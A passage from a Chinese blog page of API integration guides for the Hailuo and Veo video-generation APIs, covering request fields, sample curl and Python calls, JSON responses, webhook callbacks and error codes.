                  <p>首先先了解下基本的使用方式，就是输入提示词 <code>prompt</code>、 生成行为 <code>action</code>、首帧参考图片 <code>first_image_url</code> 以及模型 <code>model</code>，便可获得处理后的结果，首先需要简单地传递一个 <code>action</code> 字段，它的值为 <code>generate</code>，然后我们还需要输入模型，目前主要有图生视频模型 <code>minimax-i2v</code> 和文生视频模型 <code>minimax-t2v</code>，具体的内容如下：</p>
                  <p><img src="https://cdn.acedata.cloud/7jyu0n.png" width="500" class="m-auto"></p>
                  <p>可以看到这里我们设置了 Request Headers，包括：</p>
                  <ul>
                    <li><code>accept</code>：想要接收怎样格式的响应结果，这里填写为 <code>application/json</code>，即 JSON 格式。</li>
                    <li><code>authorization</code>：调用 API 的密钥，申请之后可以直接下拉选择。</li>
                  </ul>
                  <p>另外设置了 Request Body，包括：</p>
                  <ul>
                    <li><code>model</code>：生成视频的模型，主要有图生视频模型 <code>minimax-i2v</code> 和文生视频模型 <code>minimax-t2v</code> 俩种。</li>
                    <li><code>action</code>：此次视频生成任务的行为。</li>
                    <li><code>first_image_url</code>：当选择图生视频模型 <code>minimax-i2v</code> 就必须需要上传的首帧参考图片链接，不支持Base64编码。</li>
                    <li><code>prompt</code>：提示词。</li>
                    <li><code>callback_url</code>：需要回调结果的URL。</li>
                  </ul>
                  <p>选择之后，可以发现右侧也生成了对应代码，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/8psuxw.png" width="500" class="m-auto"></p>
                  <p>点击「Try」按钮即可进行测试，如上图所示，这里我们就得到了如下结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"baf1034c-684c-46be-ae6d-89ebb89b690d"</span>,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"3221eb74-1a25-447a-ba69-7d9b310e306c"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"0pv8yhe4fdrge0cmckpv23pd2g"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="string">"minimax-t2v"</span>,</span><br><span class="line">      <span class="attr">"prompt"</span>: <span class="string">"Internal heat"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="string">"https://file.aigpai.com/czjl/qoueLWBokF3ud6tdVD6VJTZuXTnK5HaMO2qAOS46Ef8VSBFUA/tmp9e3u11c1.output.mp4"</span>,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>返回结果一共有多个字段，介绍如下：</p>
                  <ul>
                    <li><code>success</code>，此时视频生成任务的状态情况。</li>
                    <li><code>task_id</code>，此时视频生成任务ID。</li>
                    <li><code>trace_id</code>，此时视频生成跟踪ID。</li>
                    <li><code>data</code>，此时视频生成任务的结果列表。<ul>
                        <li><code>id</code>，此时视频生成任务的视频ID。</li>
                        <li><code>prompt</code>，此时视频生成任务的提示词。</li>
                        <li><code>model</code>，此时视频生成任务的封面链接。</li>
                        <li><code>video_url</code>，此时视频生成任务的视频链接。</li>
                        <li><code>state</code>，此时视频生成任务的状态。</li>
                      </ul>
                    </li>
                  </ul>
                  <p>可以看到我们得到了满意的视频信息，我们只需要根据结果中 <code>data</code> 的视频链接地址获取生成的Hailuo视频即可。</p>
                  <p>另外如果想生成对应的对接代码，可以直接复制生成，例如 CURL 的代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/hailuo/videos' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "action": "generate",</span><br><span class="line">  "prompt": "Internal heat"</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2>
                  <p>由于 Hailuo Videos Generation API生成的时间相对较长，大约需要 1-2 分钟，如果 API 长时间无响应，HTTP 请求会一直保持连接，导致额外的系统资源消耗，所以本 API 也提供了异步回调的支持。</p>
                  <p>整体流程是：客户端发起请求的时候，额外指定一个 <code>callback_url</code> 字段，客户端发起 API 请求之后，API 会立马返回一个结果，包含一个 <code>task_id</code> 的字段信息，代表当前的任务 ID。当任务完成之后，生成视频的结果会通过 POST JSON 的形式发送到客户端指定的 <code>callback_url</code>，其中也包括了 <code>task_id</code> 字段，这样任务结果就可以通过 ID 关联起来了。</p>
                  <p>下面我们通过示例来了解下具体怎样操作。</p>
                  <p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://webhook.site/，打开该网站即可得到一个" target="_blank" rel="noopener">https://webhook.site/，打开该网站即可得到一个</a> Webhook URL，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/cjjfly.png" alt=""></p>
                  <p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <code>https://webhook.site/580b81f5-596e-4321-b03f-606770b0bb83</code>。</p>
                  <p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入相应的参数，具体的内容如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/odabh3.png" width="500" class="m-auto"></p>
                  <p>点击运行，可以发现会立即得到一个结果，如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"05aff65c-5e84-442b-8e29-3a5d27130840"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>稍等片刻，我们可以在 <code>https://webhook.site/580b81f5-596e-4321-b03f-606770b0bb83</code> 上观察到生成视频的结果，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/7jngb4.png" alt=""></p>
                  <p>内容如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"task_id"</span>: <span class="string">"05aff65c-5e84-442b-8e29-3a5d27130840"</span>,</span><br><span class="line">    <span class="attr">"trace_id"</span>: <span class="string">"b9856b8a-725d-45c9-befe-e789d9fd9ffb"</span>,</span><br><span class="line">    <span class="attr">"data"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"t80jhsf96srg80cmcm6b0rk8gm"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="string">"minimax-t2v"</span>,</span><br><span class="line">            <span class="attr">"prompt"</span>: <span class="string">"Internal heat"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="string">"https://file.aigpai.com/czjl/YPaUz2DcwpJqItTXAG9XHAoEoj3dbF0XPU69LT5nefCMzBFUA/tmp8s_59jez.output.mp4"</span>,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到结果中有一个 <code>task_id</code> 字段，其他的字段都和上文类似，通过该字段即可实现任务的关联。</p>
                  <h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2>
                  <p>在调用 API 时，如果遇到错误，API 会返回相应的错误代码和信息。例如：</p>
                  <ul>
                    <li><code>400 token_mismatched</code>：Bad request, possibly due to missing or invalid parameters.</li>
                    <li><code>400 api_not_implemented</code>：Bad request, possibly due to missing or invalid parameters.</li>
                    <li><code>401 invalid_token</code>：Unauthorized, invalid or missing authorization token.</li>
                    <li><code>429 too_many_requests</code>：Too many requests, you have exceeded the rate limit.</li>
                    <li><code>500 api_error</code>：Internal server error, something went wrong on the server.</li>
                  </ul>
                  <h3 id="错误响应示例"><a href="#错误响应示例" class="headerlink" title="错误响应示例"></a>错误响应示例</h3>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"error"</span>: &#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"api_error"</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">"fetch failed"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"2cf86e86-22a4-46e1-ac2f-032c0f2a4e89"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2>
                  <p>通过本文档，您已经了解了如何使用 Hailuo Videos Generation API 可通过输入提示词以及首帧参考图片来生成视频。希望本文档能帮助您更好地对接和使用该 API。如有任何问题，请随时联系我们的技术支持团队。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2025-08-06 19:01:22" itemprop="dateCreated datePublished" datetime="2025-08-06T19:01:22+08:00">2025-08-06</time>
                </span>
                <span id="/42374.html" class="post-meta-item leancloud_visitors" data-flag-title="Hailuo Videos Generation API 对接说明" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>3.5k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>3 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42373.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> API <i class="label-arrow"></i>
                  </a>
                  <a href="/42373.html" class="post-title-link" itemprop="url">Veo Videos Generation API 对接说明</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>本文将介绍一种 Veo Videos Generation API 对接说明，它是可以通过输入自定义参数来生成Veo官方的视频。</p>
                  <p>接下来介绍下 Veo Videos Generation API 的对接说明。</p>
                  <h2 id="申请流程"><a href="#申请流程" class="headerlink" title="申请流程"></a>申请流程</h2>
                  <p>要使用 API，需要先到 <a href="https://platform.acedata.cloud/documents/63e01dc3-eb21-499e-8049-3025c460058f" target="_blank" rel="noopener">Veo Videos Generation API</a> 对应页面申请对应的服务，进入页面之后，点击「Acquire」按钮，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/q6ytrc.png" alt=""></p>
                  <p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
                  <p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>首先先了解下基本的使用方式，就是输入提示词 <code>prompt</code>、 生成行为 <code>action</code>、首尾帧参考图片数组 <code>image_urls</code> 以及模型 <code>model</code>，便可获得处理后的结果，首先需要简单地传递一个 <code>action</code> 字段，它的值为 <code>text2video</code>，它主要包含三种行为：文生视频（<code>text2video</code>）、图生视频（<code>image2video</code>）、获取1080p视频（<code>get_1080p</code>），然后我们还需要输入模型 <code>model</code>，目前主要有 <code>veo2</code> 、<code>veo2-fast</code>、<code>veo3</code> 和 <code>veo3-fast</code> 模型，具体的内容如下：</p>
                  <p><img src="https://cdn.acedata.cloud/vv5pe8.png" width="500" class="m-auto"></p>
                  <p>可以看到这里我们设置了 Request Headers，包括：</p>
                  <ul>
                    <li><code>accept</code>：想要接收怎样格式的响应结果，这里填写为 <code>application/json</code>，即 JSON 格式。</li>
                    <li><code>authorization</code>：调用 API 的密钥，申请之后可以直接下拉选择。</li>
                  </ul>
                  <p>另外设置了 Request Body，包括：</p>
                  <ul>
                    <li><code>model</code>：生成视频的模型，主要有 <code>veo2</code> 、<code>veo2-fast</code>、<code>veo3</code> 和 <code>veo3-fast</code> 模型。</li>
                    <li><code>action</code>：此次视频生成任务的行为，主要包含三种行为，分别为：文生视频（<code>text2video</code>）、图生视频（<code>image2video</code>）、获取1080p视频（<code>get_1080p</code>）。</li>
                    <li><code>image_urls</code>：当选择图生视频行为 <code>image2video</code> 就必须需要上传的首尾帧参考图片链接。</li>
                    <li><code>prompt</code>：提示词。</li>
                    <li><code>callback_url</code>：需要回调结果的URL。</li>
                  </ul>
                  <p>选择之后，可以发现右侧也生成了对应代码，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/pmwh4y.png" width="500" class="m-auto"></p>
                  <p>点击「Try」按钮即可进行测试，如上图所示，这里我们就得到了如下结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"dd01fc69-e1f7-4b68-aa8c-463f6b748d11"</span>,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"9906dac0-1516-41dc-9fe3-067ca1ba8269"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"253eedc47f1c4eb2a370ed2312168f4b"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/veo/dd01fc69-e1f7-4b68-aa8c-463f6b748d11.mp4"</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2025-07-25 16:07:43"</span>,</span><br><span class="line">      <span class="attr">"complete_at"</span>: <span class="string">"2025-07-25 16:10:28"</span>,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>返回结果一共有多个字段，介绍如下：</p>
                  <ul>
                    <li><code>success</code>，此时视频生成任务的状态情况。</li>
                    <li><code>task_id</code>，此时视频生成任务ID。</li>
                    <li><code>data</code>，此时视频生成任务的结果。<ul>
                        <li><code>id</code>，此时视频生成任务的视频ID。</li>
                        <li><code>video_url</code>，此时视频生成任务的视频链接。</li>
                        <li><code>created_at</code>，此时视频生成任务的创建时间。</li>
                        <li><code>complete_at</code>，此时视频生成任务的完成时间。</li>
                        <li><code>state</code>，此时视频生成任务的状态。</li>
                      </ul>
                    </li>
                  </ul>
                  <p>可以看到我们得到了满意的视频信息，我们只需要根据结果中 <code>data</code> 的视频链接地址获取生成的Veo视频即可。</p>
                  <p>另外如果想生成对应的对接代码，可以直接复制生成，例如 CURL 的代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/veo/videos' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "action": "text2video",</span><br><span class="line">  "model": "veo2",</span><br><span class="line">  "prompt": "White ceramic coffee mug on glossy marble countertop with morning window light. Camera slowly rotates 360 degrees around the mug, pausing briefly at the handle."</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="图生视频功能"><a href="#图生视频功能" class="headerlink" title="图生视频功能"></a>图生视频功能</h2>
                  <p>如果想根据首尾帧图片进行生成视频的话，可以将参数 <code>action</code> 设置为 <code>image2video</code> ，并且输入首尾帧图片链接数组 <code>image_urls</code>。</p>
                  <p>接下来我们要必须填下一步需要扩展的提示词来自定义生成视频，就可以指定如下内容：</p>
                  <ul>
                    <li><code>model</code>：生成视频的模型，主要有<code>veo2</code> 、<code>veo2-fast</code>、<code>veo3</code> 和 <code>veo3-fast</code>。</li>
                    <li><code>image_urls</code>：当选择图生视频行为 <code>image2video</code> 就必须需要上传的首尾帧参考图片链接。</li>
                    <li><code>prompt</code>：提示词。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/8wvlqd.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/tgzfxi.png" width="500" class="m-auto"></p>
                  <p>对应的 Python 代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://api.acedata.cloud/veo/videos"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"accept"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">    <span class="string">"authorization"</span>: <span class="string">"Bearer &#123;token&#125;"</span>,</span><br><span class="line">    <span class="string">"content-type"</span>: <span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"action"</span>: <span class="string">"image2video"</span>,</span><br><span class="line">    <span class="string">"model"</span>: <span class="string">"veo2"</span>,</span><br><span class="line">    <span class="string">"prompt"</span>: <span class="string">"Let it dance"</span>,</span><br><span class="line">    <span class="string">"image_urls"</span>: [<span class="string">"https://cdn.acedata.cloud/7p1jhy.png"</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload, headers=headers)</span><br><span class="line">print(response.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>点击运行，可以发现会得到一个结果，如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"98e309f3-35bc-438d-8cb3-4015fc864b87"</span>,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"8bc68066-36de-41ef-ae5e-b7d61ff6aee8"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"59f12222b1fa4fbe9331ff2400ad1583"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/veo/98e309f3-35bc-438d-8cb3-4015fc864b87.mp4"</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2025-07-25 16:13:07"</span>,</span><br><span class="line">      <span class="attr">"complete_at"</span>: <span class="string">"2025-07-25 16:16:12"</span>,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看出，结果内容与上文的是一致的，这也就实现视频的图生视频功能。</p>
                  <h2 id="图生视频功能-1"><a href="#图生视频功能-1" class="headerlink" title="图生视频功能"></a>图生视频功能</h2>
                  <p>如果想对已经生成的Veo视频获取1080p的话，可以将参数 <code>action</code> 设置为 <code>get_1080p</code> ，并且输入需要获取1080p的视频的 ID，视频 ID 的获取是根据基本使用来获取，如下图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/hacabc.png" width="500" class="m-auto"></p>
                  <p>这时候可以看到视频的 ID 为：</p>
                  <figure class="highlight">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">"id": "59f12222b1fa4fbe9331ff2400ad1583"</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <blockquote>
                    <p>注意，这里的视频中 <code>video_id</code> 是生成后视频的 ID，如果你不知道如何生成视频，可以参考上文的基本使用来生成视频。</p>
                  </blockquote>
                  <p>接下来我们要必须填下一步需要扩展的提示词来自定义生成视频，就可以指定如下内容：</p>
                  <ul>
                    <li><code>model</code>：生成视频的模型，主要有 <code>veo2</code> 、<code>veo2-fast</code>、<code>veo3</code> 和 <code>veo3-fast</code>。</li>
                    <li><code>video_id</code>：参考的视频ID，用于获取1080p的视频。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/k56fhn.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/8gn4cr.png" width="500" class="m-auto"></p>
                  <p>点击运行，可以发现会得到一个结果，如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"47a51cfe-2e24-4aba-93b3-546c2dc52984"</span>,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"a8922eec-6f50-4f77-8104-00ded071d59d"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"59f12222b1fa4fbe9331ff2400ad1583"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/veo/47a51cfe-2e24-4aba-93b3-546c2dc52984.mp4"</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2025-07-25 16:13:07"</span>,</span><br><span class="line">      <span class="attr">"complete_at"</span>: <span class="string">"2025-07-25 16:16:12"</span>,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看出，结果内容与上文的是一致的，这也就实现视频的获取1080p视频功能。</p>
                  <h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2>
                  <p>由于 Veo Videos Generation API生成的时间相对较长，大约需要 1-2 分钟，如果 API 长时间无响应，HTTP 请求会一直保持连接，导致额外的系统资源消耗，所以本 API 也提供了异步回调的支持。</p>
                  <p>整体流程是：客户端发起请求的时候，额外指定一个 <code>callback_url</code> 字段，客户端发起 API 请求之后，API 会立马返回一个结果，包含一个 <code>task_id</code> 的字段信息，代表当前的任务 ID。当任务完成之后，生成视频的结果会通过 POST JSON 的形式发送到客户端指定的 <code>callback_url</code>，其中也包括了 <code>task_id</code> 字段，这样任务结果就可以通过 ID 关联起来了。</p>
                  <p>下面我们通过示例来了解下具体怎样操作。</p>
                  <p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://webhook.site/，打开该网站即可得到一个" target="_blank" rel="noopener">https://webhook.site/，打开该网站即可得到一个</a> Webhook URL，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/tbcnai.png" alt=""></p>
                  <p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <code>https://webhook.site/aed5cd28-f8aa-4dca-9480-8ec9b42137dc</code>。</p>
                  <p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入相应的参数，具体的内容如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/rgivs2.png" width="500" class="m-auto"></p>
                  <p>点击运行，可以发现会立即得到一个结果，如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"1ebe4f2b-59ba-4385-a4ea-0ce8a3fe12ed"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>稍等片刻，我们可以在 <code>https://webhook.site/aed5cd28-f8aa-4dca-9480-8ec9b42137dc</code> 上观察到生成视频的结果，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/238i32.png" alt=""></p>
                  <p>内容如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
